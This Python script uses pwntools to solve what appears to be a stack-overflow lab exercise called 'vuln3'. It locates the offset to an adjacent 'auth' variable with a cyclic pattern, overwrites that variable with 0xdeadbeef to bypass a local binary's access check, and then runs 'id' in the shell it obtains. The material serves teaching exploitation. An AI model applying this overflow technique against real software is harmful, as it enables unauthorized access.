#!/usr/bin/env python3
"""Solution for vuln3: data-only stack smash -- overwrite the adjacent `auth`.

No control-flow hijack, no shellcode. Just overflow buf into auth and set it
to the exact expected value.

Key pwntools:
  cyclic / cyclic_find  : find the buf -> auth offset from the leaked value
  p32(0xdeadbeef)       : the exact 4 bytes the check wants

Run:  cd example3 && make && python3 solution3/solve_vuln3.py
"""
import os
from pwn import *

context.update(arch="i386", os="linux", log_level="info")

HERE = os.path.dirname(os.path.abspath(__file__))
BIN = os.path.join(HERE, "..", "vuln3")


def find_offset():
    """Overflow with a pattern; the leaked auth value reveals the offset."""
    io = process(BIN)
    io.recvuntil(b"name: ")
    io.sendline(cyclic(64))
    line = io.recvline_startswith(b"access denied")   # access denied (auth=0x...)
    io.close()
    val = int(line.split(b"auth=")[1].split(b")")[0], 16)
    off = cyclic_find(p32(val))          # the 4 pattern bytes that landed in auth
    log.success("offset(buf -> auth) = %d", off)
    return off


def main():
    offset = find_offset()
    payload = b"A" * offset + p32(0xdeadbeef)

    io = process(BIN)
    io.recvuntil(b"name: ")
    io.sendline(payload)
    io.recvuntil(b"access granted")
    log.success("auth overwritten with 0xdeadbeef -- shell dropped")
    io.sendline(b"id; echo PWNED")
    io.interactive()


if __name__ == "__main__":
    main()
